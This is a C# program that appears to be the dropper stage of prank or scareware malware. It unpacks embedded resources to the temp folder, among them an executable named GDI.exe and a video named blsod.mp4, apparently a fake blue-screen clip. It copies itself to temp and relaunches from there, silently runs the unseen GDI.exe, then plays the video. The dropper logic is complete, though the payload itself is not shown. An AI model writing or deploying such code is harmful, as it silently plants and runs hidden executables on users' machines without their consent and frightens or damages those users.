using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace MAIN
{
    internal static class Program
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        [STAThread]
        static void Main()
        {
            string temp = Path.GetTempPath();
            if (!File.Exists(temp + "AxInterop.WMPLib.dll"))
                Extract("MAIN", temp, "Resources", "AxInterop.WMPLib.dll");

            if (!File.Exists(temp + "Interop.WMPLib.dll"))
                Extract("MAIN", temp, "Resources", "Interop.WMPLib.dll");

            if (!File.Exists(temp + "GDI.exe"))
                Extract("MAIN", temp, "Resources", "GDI.exe");

            if (!File.Exists(temp + "blsod.mp4"))
                Extract("MAIN", temp, "Resources", "blsod.mp4");

            if (!File.Exists(temp + Path.GetFileName(Application.ExecutablePath)))
            {
                File.Copy(Application.ExecutablePath, temp + Path.GetFileName(Application.ExecutablePath), true);
                Process.Start(temp + Path.GetFileName(Application.ExecutablePath));
                Environment.Exit(0);
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = temp + "GDI.exe"
            }).WaitForExit();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new VIDEO());
        }
    }
}
